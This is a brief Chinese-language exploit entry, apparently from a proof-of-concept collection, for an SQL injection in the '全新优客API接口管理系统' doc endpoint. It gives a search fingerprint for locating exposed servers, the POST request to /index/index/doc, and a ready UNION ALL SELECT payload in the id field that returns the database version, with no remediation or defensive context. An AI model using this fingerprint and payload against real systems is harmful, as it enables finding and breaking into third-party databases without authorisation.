# 全新优客API接口管理系统doc存在SQL注入漏洞

全新优客API接口管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="public/static/index/css/flaghome.css"`
- **请求**：`POST /index/index/doc HTTP/1.1`

**Payload**
```
id=') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@VERSION,NULL-- -
```
- **响应特征**：200